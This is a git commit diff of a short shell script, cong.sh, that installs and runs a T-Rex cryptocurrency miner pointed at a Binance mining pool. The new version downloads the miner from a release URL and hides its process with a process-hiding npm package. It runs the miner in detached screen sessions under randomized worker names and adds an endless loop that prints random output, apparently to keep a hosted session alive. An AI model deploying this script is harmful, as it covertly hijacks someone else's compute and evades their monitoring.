cfad3ace88c4c07a1c2ba1613be473cdef8af9e0
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-04-24 08:44:55 -0600

    Update cong.sh

--- cong.sh
+++ cong.sh
@@ -1,7 +1,13 @@
-#!/bin/bash
-apt-get install wget -y
-wget https://dl.nbminer.com/NBMiner_40.1_Linux.tgz
-tar -xvf NBMiner_40.1_Linux.tgz
-cd NBMiner_Linux
-sudo ./nbminer -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -u teguhcong.RIG_TREX -log
-
+sudo apt update
+sudo apt install screen -y
+screen -dmS ip2.sh 89 95
+%cd /opt
+sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add t-rex
+sudo apt install libpci3
+sudo apt-get install screen
+wget -nv -c https://github.com/trexminer/T-Rex/releases/download/0.25.8/t-rex-0.25.8-linux.tar.gz -O - | tar -xz
+LD_PRELOAD="" ./t-rex -a ethash -o stratum+tcp://ethash.poolbinance.com:443 -u teguhcong -p x -w $(echo $(shuf -i 201-400 -n 1)-$(shuf -i 1-200 -n 1)-$(shuf -i 401-600 -n 1)-$(shuf -i 601-800 -n 1))
+while [ 1 ]; do
+  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
+sleep 2
+done
